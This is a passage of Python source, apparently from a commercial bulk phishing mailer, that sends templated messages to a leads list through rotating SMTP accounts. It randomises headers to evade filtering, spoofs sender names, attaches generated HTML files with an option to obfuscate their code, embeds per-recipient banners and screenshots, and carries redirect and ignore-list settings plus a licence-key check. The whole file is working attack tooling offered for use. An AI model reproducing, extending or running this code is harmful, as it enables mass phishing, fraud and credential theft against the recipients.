                    img_src = logo_pics_path
                    nmsg = nmsg.replace(img, "cid:"+img_filename)
                    src_imgs.append(img_src)
                # Try direct path
                elif os.path.exists(img_src):
                    nmsg = nmsg.replace(img, "cid:"+img_filename)
                    src_imgs.append(img_src)
                # Try IMG directory as fallback
                elif os.path.exists("IMG/"+img_filename):
                    img_src = "IMG/"+img_filename
                    nmsg = nmsg.replace(img, "cid:"+img_filename)
                    src_imgs.append(img_src)
                else:
                    # Only warn if it's a real filename (not empty or placeholder)
                    if img_filename and len(img_filename) > 1:
                        print(f"Warning: CID image '{img_filename}' not found (checked LOGO_PICS/{img_filename}, IMG/{img_filename}, and {img_filename})")
                    continue

        else:
            # Handle base64 data URIs (data:image/png;base64,...)
            if img.lower().startswith('data:'):
                try:
                    # Parse data URI: data:image/png;base64,<base64data>
                    header, data = img.split(',', 1)
                    # Extract image type from header (e.g., image/png)
                    if 'image/' in header:
                        img_type = header.split('image/')[1].split(';')[0]
                    else:
                        img_type = 'png'  # Default to PNG
                    
                    # Decode base64 data
                    img_data = base64.b64decode(data)
                    
                    # Generate filename for the image
                    img_hash = str(abs(hash(img)))[:12]
                    img_filename = f"qr_{img_hash}.{img_type}"
                    
                    # Ensure LOGO_PICS directory exists
                    if not os.path.exists('LOGO_PICS'):
                        os.makedirs('LOGO_PICS')
                    
                    # Save decoded image to file
                    img_path = "LOGO_PICS/"+img_filename
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
                    
                    # Replace data URI with CID reference
                    nmsg = nmsg.replace(img, "cid:"+img_filename)
                    src_imgs.append(img_path)
                except Exception as e:
                    print(f"Warning: Could not process base64 image: {e}")
                    continue
            elif img.lower().startswith('{image}') or img.lower().startswith('{print}'):
                if img.lower().startswith('{image}'):
                    img_src = GetBanner(emails,link)
                    nmsg = nmsg.replace(img, "cid:"+os.path.basename(img_src))
                if img.lower().startswith('{print}'):
                    img_src = Screnshot(emails)
                    nmsg = nmsg.replace(img, "cid:"+os.path.basename(img_src))

            elif img.lower().startswith('http'):
                # Extract proper filename from URL, handling query parameters
                try:
                    parsed_url = urllib.parse.urlparse(img)
                    # Get filename from path or generate one from URL hash
                    url_filename = os.path.basename(parsed_url.path)
                    if not url_filename or '.' not in url_filename:
                        # Generate a filename from URL hash if no proper extension
                        url_hash = str(abs(hash(img)))[:12]
                        url_filename = f"img_{url_hash}.png"
                    # Ensure LOGO_PICS directory exists
                    if not os.path.exists('LOGO_PICS'):
                        os.makedirs('LOGO_PICS')
                    img_path = "LOGO_PICS/"+url_filename
                    if not os.path.exists(img_path):
                        urllib.request.urlretrieve(img, img_path)
                    img_src = img_path
                    nmsg = nmsg.replace(img, "cid:"+os.path.basename(img_src))
                except Exception as e:
                    # If image download fails, skip it
                    print(f"Warning: Could not download image {img}: {e}")
                    continue
            else:
                img_src = img
            if img_src and img_src not in src_imgs:
                nmsg = nmsg.replace(img, "cid:"+os.path.basename(img_src))
                src_imgs.append(img_src)

    corpo = MIMEText(nmsg, msgtype, 'utf-8')

    sname = findString(emails,name)
    sfromemail = findString(emails,fromemail)
    newsub = findString(emails,subject)

    msg = MIMEMultipart('related')
    msg['From'] = formataddr((str(Header(sname, 'utf-8')), sfromemail))
    
    # Inject rotating headers
    rotating_headers = load_rotating_headers()
    if rotating_headers:
        selected_headers = random.choice(rotating_headers)
        for key, value in selected_headers.items():
            # Don't overwrite essential headers if they happen to be in the list
            if key.lower() not in ['from', 'to', 'subject', 'content-type']:
                try:
                    # Replaces {domain}
                    if ('DOMAIN' in value or '{domain}' in value) and '@' in sfromemail:
                        domain = sfromemail.split('@')[1]
                        value = value.replace('DOMAIN', domain)
                        value = value.replace('{domain}', domain)
                    
                    # Replaces {email} with recipient email
                    if '{email}' in value:
                        value = value.replace('{email}', emails)
                    
                    # Replaces {user} with recipient username (before @)
                    if '{user}' in value and '@' in emails:
                        ruser = emails.split('@')[0]
                        value = value.replace('{user}', ruser)

                    # Replaces {date} with current date
                    if '{date}' in value:
                         # Format: Tue, 15 Nov 2022 08:12:31 -0500 
                         # Assuming standard email date format
                         current_date = datetime.now().strftime("%a, %d %b %Y %H:%M:%S %z")
                         if not current_date.endswith('00'):
                             # Fallback for timezone if %z is empty (common on some systems)
                             current_date += "+0000"
                         value = value.replace('{date}', current_date)

                    # Replaces {random} with random string
                    if '{random}' in value:
                         # Generate random string of 10-20 characters
                         random_str = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(10, 20)))
                         value = value.replace('{random}', random_str)

                except:
                    pass
                msg[key] = value
                
    #msg['From'] = bytes(name, 'utf-8').decode()+'<'+fromemail+'>'
    msg['To'] = emails
    msg['Subject'] = Header(newsub, 'utf-8')
    msg['X-Priority'] = msg_priority
    
    # Add Reply-To header if specified
    if reply_to and reply_to.strip():
        reply_email = findString(emails, reply_to.strip())
        msg['Reply-To'] = reply_email

    msg.attach(corpo)
    if usedoc:
        htmlfilen = "attach.html"

        htmlfile = MakeHtml(emails,f"{findString(emails,sfile)}",htmlfilen)
        if autoKillHTML:
            htmlfile = DemonHtml(htmlfile)

        part = MIMEBase('application', "octet-stream")
        b = open(htmlfile, "rb").read()
        bs = encodebytes(b).decode()
        part.set_payload(bs)
        part.add_header('Content-Transfer-Encoding', 'base64')
        part.add_header('Content-Disposition', 'attachment', filename=(Header(os.path.basename(htmlfile), 'utf-8').encode()))
        msg.attach(part)

    if autokilllink:
        htmlfilen = auto_code(nlink)

        htmlfile = MakeHtmlLink(emails,f"{findString(emails,sfile)}.htm",htmlfilen)
        if autoKillHTML:
            htmlfile = DemonHtml(htmlfile)

        part = MIMEBase('application', "octet-stream")
        b = open(htmlfile, "rb").read()
        bs = encodebytes(b).decode()
        part.set_payload(bs)
        part.add_header('Content-Transfer-Encoding', 'base64')
        part.add_header('Content-Disposition', 'attachment', filename=(Header(os.path.basename(htmlfile), 'utf-8').encode()))
        msg.attach(part)

    try:
        #imgs = blowimgsrc(nmsg)
        for up_imgsrc in src_imgs:
            ##imgsrc = img
            if not os.path.exists('IMG'):
                os.makedirs('IMG')
            # Check if file exists before trying to open it
            if os.path.exists(up_imgsrc):
                try:
                    imgo = open(up_imgsrc, 'rb')
                    if up_imgsrc.endswith("svg"):
                        msgImage = MIMEImage(imgo.read(),_subtype="svg+xml")
                    else:
                        msgImage = MIMEImage(imgo.read())
                    imgo.close()
                    msgImage.add_header('Content-ID', '<'+os.path.basename(up_imgsrc)+'>')
                    msgImage.add_header('Content-Disposition', 'inline', filename=(Header(os.path.basename(up_imgsrc), 'utf-8').encode()))
                    msg.attach(msgImage)
                except Exception as e:
                    print(f"Warning: Could not attach image {up_imgsrc}: {e}")
            else:
                print(f"Warning: Image file not found: {up_imgsrc}")
    except Exception as e:
        imgerror = str(e)
        print(imgerror)


    try:
        try:
            if ConnectSMTP(smtpserv,port,its_authy,findString(emails,username), password,emails,findString(emails,sender),its_secure,msg.as_string()):
                #servers.sendmail(fromemail, [emails], msg.as_string())
                print('[ Success ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL+Fore.GREEN+' [ '+emails+' ]'+Style.RESET_ALL+' '+Back.GREEN+' 250 2.0.0 OK '+Style.RESET_ALL+"")
                log_success(emails, "250 2.0.0 OK")
            else:
                print('[ Failed! ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL+Fore.RED+' [ '+emails+' ]'+Style.RESET_ALL+' '+Back.RED+' 250 2.0.0 FAIL '+Style.RESET_ALL+"")
                log_failed(emails, "250 2.0.0 FAIL")
                ##print('[!] '+emails+': Failed')
        except Exception as e:
            while 'unexpectedly closed'.lower() in str(e).lower():
                ##while ConnectSMTP(smtpserv,int(port),its_authy,username, password,emails,sender,its_secure,msg.as_string()) != True:

                if ConnectSMTP(smtpserv,port,its_authy,findString(emails,username), password,emails,findString(emails,sender),its_secure,msg.as_string()):
                    print('[ Success ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL+Fore.GREEN+' [ '+emails+' ]'+Style.RESET_ALL+' '+Back.GREEN+' 250 2.0.0 OK '+Style.RESET_ALL+"")
                    log_success(emails, "250 2.0.0 OK (retry)")
                    break
            else:
                print('[ Failed! ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL+Fore.RED+' [ '+emails+' ]'+Style.RESET_ALL+' '+Back.RED+' '+str(e)+' '+Style.RESET_ALL+"")
                log_failed(emails, str(e))
                ##print('[!] '+emails+': Failed ['+str(e)+']')
    except Exception as e:
        while 'unexpectedly closed'.lower() in str(e).lower():
            if ConnectSMTP(smtpserv,port,its_authy,username, password,emails,sender,its_secure,msg.as_string()):
                print('[ Success ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL+Fore.GREEN+' [ '+emails+' ]'+Style.RESET_ALL+' '+Back.GREEN+' 250 2.0.0 OK '+Style.RESET_ALL+"")
                log_success(emails, "250 2.0.0 OK (retry)")
                break
        else:
            print('[ Failed! ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL+Fore.RED+' [ '+emails+' ]'+Style.RESET_ALL+' '+Back.RED+' '+str(e)+' '+Style.RESET_ALL+"")
            log_failed(emails, str(e))
        ##print('[!] '+emails+': Failed ['+str(e)+']')
    finally:
        #servers.quit()
        if usedoc or autokilllink:
            if os.path.isfile(htmlfile):
                os.remove(htmlfile)

class dmailer(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            try:
                self.default_address,self.smtpserv,self.port,self.its_authy,self.username,self.password,self.fromemail,self.sender,self.its_secure = self.queue.get()
                #smtpserv,port,useauth,user,password,fromemail,sender,usessl
                Sendout(self.default_address,self.smtpserv,self.port,self.its_authy,self.username,self.password,self.fromemail,self.sender,self.its_secure)
            except Exception as e:
                print('[ Failed! ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL+Fore.RED+' [ '+self.default_address+' ]'+Style.RESET_ALL+' '+Back.RED+' '+str(e)+' '+Style.RESET_ALL+"")
                log_failed(self.default_address, str(e))
                ##print('[*] '+self.default_address+': Failed [ '+str(e)+' ]')
            finally:
                self.queue.task_done()

def checkkeycode(key):
    try:
        if key == "":
            print("Token Cant be empty")
            return False
        key_file = "0DM"+key+".key"
        found = True if os.path.exists(key_file) else False
        if found:
            with open(key_file) as my_file:
                my_file.seek(0)
                first_char = my_file.read(1)
                if not first_char:
                    return False
                else:
                    my_file.seek(0)
                    content = my_file.read()
                    content = str(hex2bin(content),'utf-8')
                    new_key,ipplus = content.split('@', 1)
                    new_key = str(hex2bin(new_key),'utf-8')
                    ip,exptime = ipplus.split(':', 1)
                    ip = str(hex2bin(ip),'utf-8')
                    exptime = str(hex2bin(exptime),'utf-8')
                    new_ip = str(get_hardware_uuid())
                    is_key = True if ((new_key == key)) else False
                    is_ip = True if ((ip == get_hardware_uuid())) else False
                    if is_key:
                        if is_ip:
                            if its_date(exptime):
                                return True
                            else:
                                return False
                        else:
                            print(key+ " Registered to another user.")
                            return False
                    else:
                        print(key, "Invalid KEY :"+ key)
                        return False
        else:
            print("Invalid KEY : "+key)
            return False
    except Exception as e:
        print(e)
        return False

def RandomSMTP(file):
    try:
        lines = open(file).read().splitlines()
        myline =random.choice(lines)
        return myline
    except Exception as ex:
        template = "[SMTP RANDOM ERROR]: exception type {0}. :\n{1!r}"
        message = template.format(type(ex).__name__, ex.args)
        print(message)
        #print("Next entry.")
        exit(0)

def RandomArraySMTP(file="smtp.txt"):
    mother_smtp_array = []
    lines = open(file).read().splitlines()
    for line_number,smtp_line in enumerate(lines):
        #print(line_number)
        table_row = {'smtp_id': 'smtp'+str(line_number), 'smtp_reset_time': '', 'smtp_count': str(0)}
        smtpSplit = smtp_line.split(' ; ')
        table_row['smtp_server'] = smtpSplit[0]
        table_row['smtp_port'] = smtpSplit[1] 
        table_row['smtp_authy'] = smtpSplit[6]
        table_row['smtp_username'] = smtpSplit[2]
        table_row['smtp_password'] = smtpSplit[3]
        table_row['msg_fromemail'] = smtpSplit[7]
        table_row['smtp_fromemail'] = smtpSplit[4]
        table_row['smtp_secure'] = smtpSplit[5]
        table_row['smtp_max'] = smtpSplit[8] if smtpSplit[8] else str(1000)
        mother_smtp_array.append(table_row)
        #print(table_row)
    #print(mother_smtp_array)
    return mother_smtp_array

if __name__ == '__main__':
    try:
        try:
            if os.path.isfile('setup.ini'):
                config = configparser.ConfigParser()
                config.read("setup.ini", "utf8")
                Token = config.get('TOKEN', 'token')
                smtpserv = config.get('SMTP', 'smtpserv')
                port = config.get('SMTP', 'port')
                username = config.get('SMTP', 'username')
                password = config.get('SMTP', 'password')
                secure = config.get('SMTP', 'secure')
                authy = config.get('SMTP', 'authy')
                sender =  config.get('SMTP', 'fromemail')
                priority =  config.get('SMTP', 'priority')
                f_loadsmtp =  config.get('SMTP', 'loadsmtp')

                name = config.get('SEND INFO', 'name')
                fromemail =  config.get('SEND INFO', 'fromemail')
                link =  config.get('SEND INFO', 'link') 

                default_address = config.get('OPTION', 'leads')
                subject = config.get('SEND INFO', 'subject')

                msgtype = config.get('OPTION', 'mstype')
                secs = config.get('OPTION', 'delay')
                useRedirect = config.get('OPTION', 'useRedirect')
                domain403 = config.get('OPTION', '403domain')
                UseGoogle = config.get('OPTION', 'UseGoogle')

                usedoc = config.get('DOC OPTION', 'usedoc')
                sfile = config.get('DOC OPTION', 'Docname')
                DocTit = config.get('DOC OPTION', 'DocTit')
                Doctype = config.get('DOC OPTION', 'Doctype')
                Docsecs = config.get('DOC OPTION', 'CreationDelay')
                AutoHtml = config.get('DOC OPTION', 'AutoHtml')
                KillHTML = config.get('DOC OPTION', 'Hide_HTML_Code')

                IgnoreEmail = config.get('OPTION', 'IgnoreEmail')
                IGNList = config.get('OPTION', 'IGNList')
                IGType = config.get('OPTION', 'IGType')

                threads = config.get('OPTION', 'thread')

                UsePause = config.get('OPTION', 'UsePause')
                PauseForSecs = config.get('OPTION', 'PauseForSecs')
                AfterSendEmail = config.get('OPTION', 'AfterSendEmail')
                reply_to = config.get('OPTION', 'reply')

                UseGoogle = True if UseGoogle == '1' else False

                UsePause = True if UsePause == 'True' else False

                loadsmtp = True if f_loadsmtp == 'True' else False

                its_authy = True  if authy == 'True' else False

                usedoc = True  if usedoc == 'True' else False

                its_secure = True  if secure == 'True' else False

                use_sort = True  if IgnoreEmail == 'True' else False

                autokilllink = True  if AutoHtml == 'True' else False

                autoKillHTML = True  if KillHTML == 'True' else False

                msg_priority = '2'  if priority.lower() == 'high'.lower() else '0'

        except Exception as e:
            print(str(e))
            exit()
        useRandomSmtp = False
        istoken = True
        Count = 0

        if istoken:
            queue = queue.Queue()

            if loadsmtp:
                if os.path.exists("smtp.txt") and os.path.getsize("smtp.txt") > 0:
                    print("SMTP-Auto is A bitch & it ROCKS!!!")
                    useRandomSmtp = True
                else:
                    print("SMTP File Either Exist and it's Empty or does not Exist's")
                    print("So fuck off and check your sheet...")
                    exit()

            try:
                texto =  codecs.open('message.html','r','utf8').read()
                file = default_address
                inputs = open(file,'r').read().splitlines()
            except Exception as e:
                print(str(e))
                exit()


            try:
                # Validate configuration integers
                try:
                    threads = int(threads)
                except ValueError:
                    print(f"Warning: Invalid threads value '{threads}'. Defaulting to 1.")
                    threads = 1

                try:
                    AfterSendEmail = int(AfterSendEmail)
                except ValueError:
                    print(f"Warning: Invalid AfterSendEmail value '{AfterSendEmail}'. Defaulting to 1.")
                    AfterSendEmail = 1

                try:
                    PauseForSecs = int(PauseForSecs)
                except ValueError:
                    print(f"Warning: Invalid PauseForSecs value '{PauseForSecs}'. Defaulting to 1.")
                    PauseForSecs = 1

                # Validate useRedirect as it's used as int later
                try:
                    int(useRedirect)
                except ValueError:
                     print(f"Configuration Warning: Invalid useRedirect value '{useRedirect}'. Defaulting to 0.")
                     useRedirect = "0"

                if use_sort:
                    lines = open(file).read()
                    inputs = sort_leads(lines,IGNList,IGType)

                for i in range(int(threads)):
                    t = dmailer(queue)
                    t.daemon = True
                    t.start()
                for i in inputs:
                    if UsePause:
                        Count += 1
                        if  Count >= int(AfterSendEmail):
                            print("Sleeping for %s secs" %(PauseForSecs))
                            time.sleep(int(PauseForSecs))
                            Count = 0
                    email = i.rstrip().lower()
                    if check(email):
                        
                        #print("[@] {}: Queueing...".format(email))
                        if useRandomSmtp:
                            random_smtp = RandomArraySMTP()
                            selected_smtp = random.sample(random_smtp, 1)[0]
                            while selected_smtp['smtp_count'] == selected_smtp['smtp_max']:
                                selected_smtp = random.sample(random_smtp, 1)[0]
                                print("{0} used its MaxLimit:{1} ---> Randomly Reselecting another...".format(selected_smtp['smtp_id'],selected_smtp['smtp_max']))
                            selected_smtp['smtp_count'] = str(int(selected_smtp['smtp_count']) + 1)
                            smtpserv = selected_smtp['smtp_server']
                            port = selected_smtp['smtp_port']
                            its_authy = selected_smtp['smtp_authy']
                            username = selected_smtp['smtp_username']
                            password = selected_smtp['smtp_password']
                            fromemail= selected_smtp['msg_fromemail']
                            sender = selected_smtp['smtp_fromemail']
                            its_secure = selected_smtp['smtp_secure']
                            
                            #smtpserv,port,useauth,user,password,fromemail,sender,usessl
                            queue.put((email,smtpserv,port,its_authy,username,password,fromemail,sender,its_secure))
                        else:
                            queue.put((email,smtpserv,port,its_authy,username,password,fromemail,sender,its_secure))
                    else:
                        print('[ Failed! ]: '+Back.YELLOW+Fore.BLACK+' '+time.strftime("%H:%M:%S %p")+' '+Style.RESET_ALL+Fore.RED+' [ '+email+' ]'+Style.RESET_ALL+' '+Back.RED+' Invalid email '+Style.RESET_ALL)
                        log_failed(email, "Invalid email")
                        ##print('[!] '+email+': Failed [ Invalid email ]')
                
                queue.join()
                

            except Exception as e:
                print(str(e))

        else:
            exit()

    except Exception as e:
        print(f"[!] Exception: {str(e)} exiting...")
        exit()



